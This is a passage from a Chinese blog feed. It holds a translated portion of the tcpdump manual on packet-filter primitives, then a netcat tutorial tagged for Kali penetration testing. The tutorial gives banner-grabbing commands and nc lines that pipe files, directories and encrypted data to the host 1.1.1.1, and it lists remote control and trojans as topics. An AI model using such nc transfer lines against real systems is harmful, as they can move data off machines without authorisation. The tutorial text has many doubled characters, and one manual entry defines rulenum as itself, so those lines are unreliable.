<h2 id="ip-protochain-protocol"><a href="#ip-protochain-protocol" class="headerlink" title="ip protochain protocol"></a>ip protochain protocol</h2><p>与ip6 protochain protocol 含义相同, 但这用在IPv4数据包.</p>
<h2 id="ether-broadcast"><a href="#ether-broadcast" class="headerlink" title="ether broadcast"></a>ether broadcast</h2><p>如果数据包是以太网广播数据包, 则与此对应的条件表达式为真. ether 关键字是可选的.</p>
<h2 id="ip-broadcast"><a href="#ip-broadcast" class="headerlink" title="ip broadcast"></a>ip broadcast</h2><p>如果数据包是IPv4广播数据包, 则与此对应的条件表达式为真. 这将使tcpdump 检查广播地址是否符合全0和全1的一些约定,并查找网络接口的网络掩码(网络接口为当时在其上抓包的网络接口).</p>
<p>如果抓包所在网络接口的网络掩码不合法, 或者此接口根本就没有设置相应网络地址和网络， 亦或是在linux下的’any’网络接口上抓包(此’any’接口可以收到系统中不止一个接口的数据包(nt: 实际上, 可理解为系统中所有可用的接口)),网络掩码的检查不能正常进行.</p>
<h2 id="ether-multicast"><a href="#ether-multicast" class="headerlink" title="ether multicast"></a>ether multicast</h2><p>如果数据包是一个以太网多点广播数据包(nt: 多点广播, 可理解为把消息同时传递给一组目的地址, 而不是网络中所有地址,后者为可称为广播(broadcast)), 则与此对应的条件表达式为真. 关键字ether 可以省略. 此选项的含义与以下条件表达式含义一致:`ether[0] &amp; 1 != 0’(nt: 可理解为, 以太网数据包中第0个字节的最低位是1, 这意味这是一个多点广播数据包).</p>
<h2 id="ip-multicast"><a href="#ip-multicast" class="headerlink" title="ip multicast"></a>ip multicast</h2><p>如果数据包是ipv4多点广播数据包, 则与此对应的条件表达式为真.</p>
<h2 id="ip6-multicast"><a href="#ip6-multicast" class="headerlink" title="ip6 multicast"></a>ip6 multicast</h2><p>如果数据包是ipv6多点广播数据包, 则与此对应的条件表达式为真.</p>
<h2 id="ether-proto-protocol"><a href="#ether-proto-protocol" class="headerlink" title="ether proto protocol"></a>ether proto protocol</h2><p>如果数据包属于以下以太协议类型, 则与此对应的条件表达式为真.<br>协议(protocol)字段, 可以是数字或以下所列出了名字: ip, ip6, arp, rarp, atalk(AppleTalk网络协议),aarp(nt: AppleTalk Address Resolution Protocol, AppleTalk网络的地址解析协议),decnet(nt: 一个由DEC公司所提供的网络协议栈), sca(nt: 未知, 需补充),lat(Local Area Transport, 区域传输协议, 由DEC公司开发的以太网主机互联协议),mopdl, moprc, iso(nt: 未知, 需补充), stp(Spanning tree protocol, 生成树协议, 可用于防止网络中产生链接循环),ipx（nt: Internetwork Packet Exchange, Novell 网络中使用的网络层协议）, 或者netbeui(nt: NetBIOS Extended User Interface，可理解为, 网络基本输入输出系统接口扩展).</p>
<p>protocol字段可以是一个数字或以下协议名之一:ip, ip6, arp, rarp, atalk, aarp, decnet, sca, lat,mopdl, moprc, iso, stp, ipx, 或者netbeui.<br>必须要注意的是标识符也是关键字, 从而必须通过’\’来进行转义.</p>
<p>(SNAP：子网接入协议 （SubNetwork Access Protocol）)</p>
<p>在光纤分布式数据网络接口(其表达元形式可以是’fddi protocol arp’), 令牌环网(其表达元形式可以是’tr protocol arp’),以及IEEE 802.11 无线局域网(其表达元形式可以是’wlan protocol arp’)中, protocol标识符来自802.2 逻辑链路控制层头,在FDDI, Token Ring 或 802.1头中会包含此逻辑链路控制层头.</p>
<p>当以这些网络上的相应的协议标识为过滤条件时, tcpdump只是检查LLC头部中以0x000000为组成单元标识符(OUI, 0x000000<br>标识一个内部以太网)的一段’SNAP格式结构’中的protocol ID 域, 而不会管包中是否有一段OUI为0x000000的’SNAP格式<br>结构’(nt: SNAP, SubNetwork Access Protocol,子网接入协议 ). 以下例外:</p>
<p>iso tcpdump 会检查LLC头部中的DSAP域(Destination service Access Point, 目标服务接入点)和SSAP域(源服务接入点).(nt: iso 协议未知, 需补充)</p>
<h2 id="stp-以及-netbeui"><a href="#stp-以及-netbeui" class="headerlink" title="stp 以及 netbeui"></a>stp 以及 netbeui</h2><p>tcpdump 将会检查LLC 头部中的目标服务接入点(Destination service Access Point);</p>
<h2 id="atalk"><a href="#atalk" class="headerlink" title="atalk"></a>atalk</h2><p>tcpdump 将会检查LLC 头部中以0x080007 为OUI标识的’SNAP格式结构’, 并会检查AppleTalk etype域.<br>(nt: AppleTalk etype 是否位于SNAP格式结构中, 未知, 需补充).</p>
<p>此外, 在以太网中, 对于ether proto protocol 选项, tcpdump 会为 protocol 所指定的协议检查<br>以太网类型域(the Ethernet type field), 但以下这些协议除外:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iso, stp, and netbeui</div></pre></td></tr></table></figure></p>
<p>tcpdump 将会检查802.3 物理帧以及LLC 头(这两种检查与FDDI, TR, 802.11网络中的相应检查一致);<br>(nt: 802.3, 理解为IEEE 802.3, 其为一系列IEEE 标准的集合. 此集合定义了有线以太网络中的物理层以及数据链路层的媒体接入控制子层. stp 在上文已有描述)</p>
<h2 id="atalk-1"><a href="#atalk-1" class="headerlink" title="atalk"></a>atalk</h2><p>tcpdump 将会检查以太网物理帧中的AppleTalk etype 域 ,　同时也会检查数据包中LLC头部中的’SNAP格式结构’(这两种检查与FDDI, TR, 802.11网络中的相应检查一致)</p>
<p>aarp tcpdump 将会检查AppleTalk ARP etype 域, 此域或存在于以太网物理帧中, 或存在于LLC(由802.2 所定义)的’SNAP格式结构’中, 当为后者时, 该’SNAP格式结构’的OUI标识为0x000000;(nt: 802.2, 可理解为, IEEE802.2, 其中定义了逻辑链路控制层(LLC), 该层对应于OSI 网络模型中数据链路层的上层部分.</p>
<p>LLC 层为使用数据链路层的用户提供了一个统一的接口(通常用户是网络层). LLC层以下是媒体接入控制层(nt: MAC层,对应于数据链路层的下层部分).该层的实现以及工作方式会根据不同物理传输媒介的不同而有所区别(比如, 以太网, 令牌环网,光纤分布数据接口(nt: 实际可理解为一种光纤网络), 无线局域网(802.11), 等等.)</p>
<p>ipx tcpdump 将会检查物理以太帧中的IPX etype域, LLC头中的IPX DSAP域，无LLC头并对IPX进行了封装的802.3帧,以及LLC 头部’SNAP格式结构’中的IPX etype 域(nt | rt: SNAP frame, 可理解为, LLC 头中的’SNAP格式结构’.该含义属初步理解阶段, 需补充).</p>
<h2 id="decnet-src-host"><a href="#decnet-src-host" class="headerlink" title="decnet src host"></a>decnet src host</h2><p>如果数据包中DECNET源地址为host, 则与此对应的条件表达式为真.<br>(nt:decnet, 由Digital Equipment Corporation 开发, 最早用于PDP-11 机器互联的网络协议)</p>
<h2 id="decnet-dst-host"><a href="#decnet-dst-host" class="headerlink" title="decnet dst host"></a>decnet dst host</h2><p>如果数据包中DECNET目的地址为host, 则与此对应的条件表达式为真.<br>(nt: decnet 在上文已有说明)</p>
<h2 id="decnet-host-host"><a href="#decnet-host-host" class="headerlink" title="decnet host host"></a>decnet host host</h2><p>如果数据包中DECNET目的地址或DECNET源地址为host, 则与此对应的条件表达式为真.<br>(nt: decnet 在上文已有说明)</p>
<h2 id="ifname-interface"><a href="#ifname-interface" class="headerlink" title="ifname interface"></a>ifname interface</h2><p>如果数据包已被标记为从指定的网络接口中接收的, 则与此对应的条件表达式为真.<br>(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))</p>
<h2 id="on-interface"><a href="#on-interface" class="headerlink" title="on interface"></a>on interface</h2><p>与 ifname interface 含义一致.</p>
<h2 id="rnr-num"><a href="#rnr-num" class="headerlink" title="rnr num"></a>rnr num</h2><p>如果数据包已被标记为匹配PF的规则, 则与此对应的条件表达式为真.<br>(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))</p>
<h2 id="rulenum-num"><a href="#rulenum-num" class="headerlink" title="rulenum num"></a>rulenum num</h2><p>与 rulenum num 含义一致.</p>
<h2 id="reason-code"><a href="#reason-code" class="headerlink" title="reason code"></a>reason code</h2><p>如果数据包已被标记为包含PF的匹配结果代码, 则与此对应的条件表达式为真.有效的结果代码有: match, bad-offset,fragment, short, normalize, 以及memory.<br>(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))</p>
<h2 id="rset-name"><a href="#rset-name" class="headerlink" title="rset name"></a>rset name</h2><p>如果数据包已被标记为匹配指定的规则集, 则与此对应的条件表达式为真.<br>(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))</p>
<h2 id="ruleset-name"><a href="#ruleset-name" class="headerlink" title="ruleset name"></a>ruleset name</h2><p>与 rset name 含义一致.</p>
<h2 id="srnr-num"><a href="#srnr-num" class="headerlink" title="srnr num"></a>srnr num</h2><p>如果数据包已被标记为匹配指定的规则集中的特定规则(nt: specified PF rule number, 特定规则编号, 即特定规则),则与此对应的条件表达式为真.(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))</p>
<h2 id="subrulenum-num"><a href="#subrulenum-num" class="headerlink" title="subrulenum num"></a>subrulenum num</h2><p>与 srnr 含义一致.</p>
<h2 id="action-act"><a href="#action-act" class="headerlink" title="action act"></a>action act</h2><p>如果包被记录时PF会执行act指定的动作, 则与此对应的条件表达式为真. 有效的动作有: pass, block.(此选项只适用于被OpenBSD中pf程序做过标记的包(nt: pf, packet filter, 可理解为OpenBSD中的防火墙程序))</p>
<p>ip, ip6, arp, rarp, atalk, aarp, decnet, iso, stp, ipx, netbeui</p>
<p>与以下表达元含义一致:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ether proto p</div></pre></td></tr></table></figure></p>
<p>p是以上协议中的一个.</p>
<p>lat, moprc, mopdl</p>
<p>与以下表达元含义一致:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ether proto p</div></pre></td></tr></table></figure></p>
<p>p是以上协议中的一个. 必须要注意的是tcpdump目前还不能分析这些协议.</p>
<h2 id="vlan-vlan-id"><a href="#vlan-vlan-id" class="headerlink" title="vlan [vlan_id]"></a>vlan [vlan_id]</h2><p>如果数据包为IEEE802.1Q VLAN 数据包, 则与此对应的条件表达式为真.<br>(nt: IEEE802.1Q VLAN, 即IEEE802.1Q 虚拟网络协议, 此协议用于不同网络的之间的互联).如果[vlan_id] 被指定, 则只有数据包含有指定的虚拟网络id(vlan_id), 则与此对应的条件表达式为真.要注意的是, 对于VLAN数据包, 在表达式中遇到的第一个vlan关键字会改变表达式中接下来关键字所对应数据包中数据的开始位置(即解码偏移). 在VLAN网络体系中过滤数据包时, vlan [vlan_id]表达式可以被多次使用. 关键字vlan每出现一次都会增加4字节过滤偏移(nt: 过滤偏移, 可理解为上面的解码偏移).</p>
<p>例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vlan 100 &amp;&amp; vlan 200</div></pre></td></tr></table></figure></p>
<p>表示: 过滤封装在VLAN100中的VLAN200网络上的数据包</p>
<p>再例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vlan &amp;&amp; vlan 300 &amp;&amp; ip</div></pre></td></tr></table></figure></p>
<p>表示: 过滤封装在VLAN300 网络中的IPv4数据包, 而VLAN300网络又被更外层的VLAN封装</p>
<h2 id="mpls-label-num"><a href="#mpls-label-num" class="headerlink" title="mpls [label_num]"></a>mpls [label_num]</h2><p>如果数据包为MPLS数据包, 则与此对应的条件表达式为真.<br>(nt: MPLS, Multi-Protocol Label Switch, 多协议标签交换, 一种在开放的通信网上利用标签引导数据传输的技术).</p>
<p>如果[label_num] 被指定, 则只有数据包含有指定的标签id(label_num), 则与此对应的条件表达式为真.</p>
<p>要注意的是, 对于内含MPLS信息的IP数据包(即MPLS数据包), 在表达式中遇到的第一个MPLS关键字会改变表达式中接下来关键字所对应数据包中数据的开始位置(即解码偏移). 在MPLS网络体系中过滤数据包时, mpls [label_num]表达式可以被多次使用. 关键字mpls每出现一次都会增加4字节过滤偏移(nt: 过滤偏移, 可理解为上面的解码偏移).</p>
<p>例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mpls 100000 &amp;&amp; mpls 1024</div></pre></td></tr></table></figure></p>
<p>表示: 过滤外层标签为100000 而层标签为1024的数据包</p>
<p>再如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mpls &amp;&amp; mpls 1024 &amp;&amp; host 192.9.200.1</div></pre></td></tr></table></figure></p>
<p>表示: 过滤发往或来自192.9.200.1的数据包, 该数据包的内层标签为1024, 且拥有一个外层标签.</p>
<h2 id="pppoed"><a href="#pppoed" class="headerlink" title="pppoed"></a>pppoed</h2><p>如果数据包为PPP-over-Ethernet的服务器探寻数据包(nt: Discovery packet,<br>其ethernet type 为0x8863),则与此对应的条件表达式为真.<br>(nt: PPP-over-Ethernet, 点对点以太网承载协议, 其点对点的连接建立分为Discovery阶段(地址发现) 和PPPoE 会话建立阶段 , discovery 数据包就是第一阶段发出来的包. ethernet type是以太帧里的一个字段，用来指明应用于帧数据字段的协议)</p>
<h2 id="pppoes"><a href="#pppoes" class="headerlink" title="pppoes"></a>pppoes</h2><p>如果数据包为PPP-over-Ethernet会话数据包(nt: ethernet type 为0x8864, PPP-over-Ethernet在上文已有说明, 可搜索关键字’PPP-over-Ethernet’找到其描述), 则与此对应的条件表达式为真.</p>
<p>要注意的是, 对于PPP-over-Ethernet会话数据包, 在表达式中遇到的第一个pppoes关键字会改变表达式中接下来关键字所对应数据包中数据的开始位置(即解码偏移).</p>
<p>例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pppoes &amp;&amp; ip</div></pre></td></tr></table></figure></p>
<p>表示: 过滤嵌入在PPPoE数据包中的ipv4数据包</p>
<p>tcp, udp, icmp</p>
<p>与以下表达元含义一致:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip proto p or ip6 proto p</div></pre></td></tr></table></figure></p>
<p>其中p 是以上协议之一(含义分别为: 如果数据包为ipv4或ipv6数据包并且其协议类型为 tcp,udp, 或icmp则与此对应的条件表达式为真)</p>
<h2 id="iso-proto-protocol"><a href="#iso-proto-protocol" class="headerlink" title="iso proto protocol"></a>iso proto protocol</h2><p>如果数据包的协议类型为iso-osi协议栈中protocol协议, 则与此对应的条件表达式为真.(nt: [初解]iso-osi 网络模型中每<br>层的具体协议与tcp/ip相应层采用的协议不同. iso-osi各层中的具体协议另需补充 )</p>
<p>protocol 可以是一个数字编号, 或以下名字中之一:</p>
<p>clnp, esis, or isis.</p>
<p>(nt: clnp, Connectionless Network Protocol, 这是OSI网络模型中网络层协议 , esis, isis 未知, 需补充)</p>
<p>clnp, esis, isis</p>
<p>是以下表达的缩写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iso proto p</div></pre></td></tr></table></figure></p>
<p>其中p 是以上协议之一</p>
<p>l1, l2, iih, lsp, snp, csnp, psnp</p>
<p>为IS-IS PDU 类型 的缩写.</p>
<p>(nt: IS-IS PDU, Intermediate system to intermediate system Protocol Data Unit, 中间系统到中间系统的协议数据单元. OSI(Open Systems Interconnection)网络由终端系统, 中间系统构成.</p>
<p>终端系统指路由器, 而终端系统指用户设备. 路由器形成的本地组称之为’区域’（Area）和多个区域组成一个’域’（Domain）.</p>
<p>IS-IS 提供域内或区域内的路由. l1, l2, iih, lsp, snp, csnp, psnp 表示PDU的类型, 具体含义另需补充)</p>
<h2 id="vpi-n"><a href="#vpi-n" class="headerlink" title="vpi n"></a>vpi n</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 ,如果数据包为ATM数据包, 并且其虚拟路径标识为n, 则与此对应的条件表达式为真.(nt: ATM, Asychronous Transfer Mode, 实际上可理解为由ITU-T(国际电信联盟电信标准化部门)提出的一个与TCP/IP中IP层功能等同的一系列协议, 具体协议层次另需补充)</p>
<h2 id="vci-n"><a href="#vci-n" class="headerlink" title="vci n"></a>vci n</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 ,如果数据包为ATM数据包, 并且其虚拟通道标识为n, 则与此对应的条件表达式为真.<br>(nt: ATM, 在上文已有描述)</p>
<h2 id="lane"><a href="#lane" class="headerlink" title="lane"></a>lane</h2><p>如果数据包为ATM LANE 数据包, 则与此对应的条件表达式为真. 要注意的是, 如果是模拟以太网的LANE数据包或者LANE逻辑单元控制包, 表达式中第一个lane关键字会改变表达式中随后条件的测试. 如果没有指定lane关键字, 条件测试将按照数据包中内含LLC(逻辑链路层)的ATM包来进行.</p>
<h2 id="llc"><a href="#llc" class="headerlink" title="llc"></a>llc</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 ,如果数据包为ATM数据包,　并且内含LLC则与此对应的条件表达式为真</p>
<h2 id="oamf4s"><a href="#oamf4s" class="headerlink" title="oamf4s"></a>oamf4s</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包<br>并且是Segment OAM F4 信元(VPI=0 并且 VCI=3), 则与此对应的条件表达式为真.</p>
<p>(nt: OAM, Operation Administration and Maintenance, 操作管理和维护,可理解为:ATM网络中用于网络管理所产生的ATM信元的分类方式.</p>
<p>ATM网络中传输单位为信元, 要传输的数据终究会被分割成固定长度(53字节)的信元,<br>(初理解: 一条物理线路可被复用, 形成虚拟路径(virtual path). 而一条虚拟路径再次被复用, 形成虚拟信道(virtual channel)).</p>
<p>通信双方的编址方式为:虚拟路径编号(VPI)/虚拟信道编号(VCI)).</p>
<p>OAM F4 flow 信元又可分为segment 类和end-to-end 类, 其区别未知, 需补充.)</p>
<h2 id="oamf4e"><a href="#oamf4e" class="headerlink" title="oamf4e"></a>oamf4e</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是 end-to-end OAM F4 信元(VPI=0 并且 VCI=4), 则与此对应的条件表达式为真.<br>(nt: OAM 与 end-to-end OAM F4 在上文已有描述, 可搜索’oamf4s’来定位)</p>
<h2 id="oamf4"><a href="#oamf4" class="headerlink" title="oamf4"></a>oamf4</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是 end-to-end 或 segment OAM F4 信元(VPI=0 并且 VCI=3 或者 VCI=4), 则与此对应的条件表达式为真.<br>(nt: OAM 与 end-to-end OAM F4 在上文已有描述, 可搜索’oamf4s’来定位)</p>
<h2 id="oam"><a href="#oam" class="headerlink" title="oam"></a>oam</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包<br>并且是 end-to-end 或 segment OAM F4 信元(VPI=0 并且 VCI=3 或者 VCI=4), 则与此对应的条件表达式为真.<br>(nt: 此选项与oamf4重复, 需确认)</p>
<h2 id="metac"><a href="#metac" class="headerlink" title="metac"></a>metac</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包<br>并且是来自’元信令线路’(nt: VPI=0 并且 VCI=1, ‘元信令线路’, meta signaling circuit, 具体含义未知, 需补充),<br>则与此对应的条件表达式为真.</p>
<h2 id="bcc"><a href="#bcc" class="headerlink" title="bcc"></a>bcc</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自’广播信令线路’(nt: VPI=0 并且 VCI=2, ‘广播信令线路’, broadcast signaling circuit, 具体含义未知, 需补充),<br>则与此对应的条件表达式为真.</p>
<h2 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自’信令线路’(nt: VPI=0 并且 VCI=5, ‘信令线路’, signaling circuit, 具体含义未知, 需补充),则与此对应的条件表达式为真.</p>
<h2 id="ilmic"><a href="#ilmic" class="headerlink" title="ilmic"></a>ilmic</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自’ILMI线路’(nt: VPI=0 并且 VCI=16, ‘ILMI’, Interim Local Management Interface , 可理解为基于SNMP(简易网络管理协议)的用于网络管理的接口)则与此对应的条件表达式为真.</p>
<h2 id="connectmsg"><a href="#connectmsg" class="headerlink" title="connectmsg"></a>connectmsg</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自’信令线路’并且是Q.2931协议中规定的以下几种消息: Setup, Calling Proceeding, Connect,Connect Ack, Release, 或者Release Done. 则与此对应的条件表达式为真.(nt: Q.2931 为ITU(国际电信联盟)制定的信令协议. 其中规定了在宽带综合业务数字网络的用户接口层建立, 维护, 取消<br>网络连接的相关步骤.)</p>
<h2 id="metaconnect"><a href="#metaconnect" class="headerlink" title="metaconnect"></a>metaconnect</h2><p>如果数据包为ATM数据包, 则与此对应的条件表达式为真. 对于Solaris 操作系统上的SunATM设备 , 如果数据包为ATM数据包并且是来自’元信令线路’并且是Q.2931协议中规定的以下几种消息: Setup, Calling Proceeding, Connect,Connect Ack, Release, 或者Release Done. 则与此对应的条件表达式为真.</p>
<h2 id="expr-relop-expr"><a href="#expr-relop-expr" class="headerlink" title="expr relop expr"></a>expr relop expr</h2><p>如果relop 两侧的操作数(expr)满足relop 指定的关系, 则与此对应的条件表达式为真.<br>relop 可以是以下关系操作符之一: <code>&gt;, &lt;, &lt;=, =, !=.</code><br>expr 是一个算术表达式. 此表达式中可使用整型常量(表示方式与标准C中一致), 二进制操作符(+, -, *, /, &amp;, |,&lt;&lt;, &gt;&gt;), 长度操作符, 以及对特定数据包中数据的引用操作符. 要注意的是, 所有的比较操作都默认操作数是无符号的,<br>例如, 0x80000000 和 0xffffffff 都是大于0的(nt: 对于有符号的比较, 按照补码规则, 0xffffffff会小于0). 如果要引用数据包中的数据, 可采用以下表达方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proto [expr : size]</div></pre></td></tr></table></figure></p>
<p>proto 的取值可以是以下取值之一:ether, fddi, tr, wlan, ppp, slip, link, ip, arp, rarp,tcp, udp, icmp, ip6 或者 radio. 这指明了该引用操作所对应的协议层.(ether, fddi, wlan,tr, ppp, slip and link 对应于数据链路层, radio 对应于802.11(wlan,无线局域网)某些数据包中的附带的”radio”头(nt: 其中描述了波特率, 数据加密等信息)).</p>
<p>要注意的是, tcp, udp 等上层协议目前只能应用于网络层采用为IPv4或IPv6协议的网络(此限制会在tcpdump未来版本中进行修改). 对于指定协议的所需数据, 其在包数据中的偏移字节由expr 来指定.</p>
<p>以上表达中size 是可选的, 用来指明我们关注那部分数据段的长度(nt:通常这段数据<br>是数据包的一个域)， 其长度可以是1, 2, 或4个字节. 如果不给定size, 默认是1个字节. 长度操作符的关键字为len,这代码整个数据包的长度.</p>
<p>例如, ‘ether[0] &amp; 1 != 0’ 将会使tcpdump 抓取所有多点广播数据包.(nt: ether[0]字节的最低位为1表示数据包目的地址是多点广播地址). ‘ip[0] &amp; 0xf != 5’ 对应抓取所有带有选项的IPv4数据包. ‘ip[6:2] &amp; 0x1fff = 0’对应抓取没被破碎的IPv4数据包或者<br>其片段编号为0的已破碎的IPv4数据包. 这种数据检查方式也适用于tcp和udp数据的引用,<br>即, tcp[0]对应于TCP 头中第一个字节, 而不是对应任何一个中间的字节.</p>
<p>一些偏移以及域的取值除了可以用数字也可用名字来表达. 以下为可用的一些域(协议头中的域)的名字: icmptype (指ICMP 协议头中type域), icmpcode (指ICMP 协议头code 域), 以及tcpflags(指TCP协议头的flags 域)</p>
<p>以下为ICMP 协议头中type 域的可用取值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">icmp-echoreply, icmp-unreach, icmp-sourcequench, icmp-redirect, icmp-echo, icmp-routeradvert,</div><div class="line">icmp-routersolicit, icmp-timx-ceed, icmp-paramprob, icmp-tstamp, icmp-tstampreply,</div><div class="line">icmp-ireq, icmp-ireqreply, icmp-maskreq, icmp-maskreply.</div></pre></td></tr></table></figure></p>
<p>以下为TCP 协议头中flags 域的可用取值:tcp-fin, tcp-syn, tcp-rst, tcp-push,<br>tcp-ack, tcp-urg.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;用简单的话来定义tcpdump，就是：dump the traffic on a network，根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://www.unix-like.com/categories/security/"/>
    
    
      <category term="Kali linux渗透测试" scheme="http://www.unix-like.com/tags/Kali-linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>netcat-nc</title>
    <link href="http://www.unix-like.com/2017/06/16/security/netcat-nc/"/>
    <id>http://www.unix-like.com/2017/06/16/security/netcat-nc/</id>
    <published>2017-06-16T01:48:47.000Z</published>
    <updated>2017-06-16T02:33:16.900Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li>网络工工具中的瑞士士军刀刀——小小身身材、大大智慧</li>
<li>侦听模式 / 传输模式</li>
<li>telnet / 获取banner信息</li>
<li>传输文文本信息</li>
<li>传输文文件/⺫目目录</li>
<li>加密传输文文件</li>
<li>远程控制/木木⻢马</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<a id="more"></a>
<h1 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET / BANNER"></a>NC——TELNET / BANNER</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nc –nv 1.1.1.1 110</div><div class="line">nc –nv 1.1.1.1 25</div><div class="line">nc –nv 1.1.1.1 80</div></pre></td></tr></table></figure>
<h1 id="NC——传输文文本信息"><a href="#NC——传输文文本信息" class="headerlink" title="NC——传输文文本信息"></a>NC——传输文文本信息</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc <span class="_">-l</span> -p 4444</div><div class="line">B:nc –nv 1.1.1.1 4444</div></pre></td></tr></table></figure>
<h1 id="NC–传输文文件-目录"><a href="#NC–传输文文件-目录" class="headerlink" title="NC–传输文文件/目录"></a>NC–传输文文件/目录</h1><h2 id="传输文文件"><a href="#传输文文件" class="headerlink" title="传输文文件"></a>传输文文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 &gt; 1.mp4</div><div class="line">B:nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</div></pre></td></tr></table></figure>
<p>或<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -q 1 -lp 333 &lt; a.mp4</div><div class="line">B: nc -nv 1.1.1.1 333 &gt; 2.mp4</div></pre></td></tr></table></figure></p>
<h2 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:tar -cvf - music/ | nc -lp 333 –q 1</div><div class="line">B:nc -nv 1.1.1.1 333 | tar -xvf –</div></pre></td></tr></table></figure>
<h2 id="加密传文文件"><a href="#加密传文文件" class="headerlink" title="加密传文文件"></a>加密传文文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A:nc -lp 333 | mcrypt --flush -Fbqd <span class="_">-a</span> rijndael-256 -m ecb &gt; 1.mp4</div><div class="line">B: mcrypt --flush -Fbq <span class="_">-a</span> rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</div></pre></td></tr></table></figure>
<h1 id="NC–流媒体服务"><a href="#NC–流媒体服务" class="headerlink" title="NC–流媒体服务"></a>NC–流媒体服务</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">A: cat 1.mp4 | nc -lp 333</div><div class="line">B: 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</div></pre></td></tr></table></figure>
